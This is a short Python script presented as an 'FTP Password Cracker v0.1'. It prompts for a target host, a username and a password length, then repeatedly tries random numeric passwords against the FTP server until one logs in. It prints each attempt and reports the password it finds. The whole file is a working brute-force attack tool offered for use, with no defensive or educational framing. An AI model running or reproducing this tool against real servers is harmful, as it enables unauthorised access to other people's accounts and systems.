import ftplib, time, random, os

cnt = 1

charset = ['1','2','3','4','5','6','7','8','9','0']

passw = ""

print("FTP Password Cracker v0.1")
print("Written from D####n")
host = input("Enter The Host Adress/IP   : ")
user = input("Enter The Host username    : ")
passlen = int(input("Enter The Password length  : "))
timeset = float(input("Enter The Millisecond 0.25 : "))

while True:
    for i in range(passlen):
        c = charset [random.randint(0,9)]
        passw = passw + c
    try:
        ftp = ftplib.FTP(host,user,passw)
        print("[+] Password found")
        print("[+] Password - {} ".format(passw))
        break
    except:
        print(cnt, "[-] Password Trying - {}".format(passw))
        cnt += 1
        passw = ""
        time.sleep(timeset)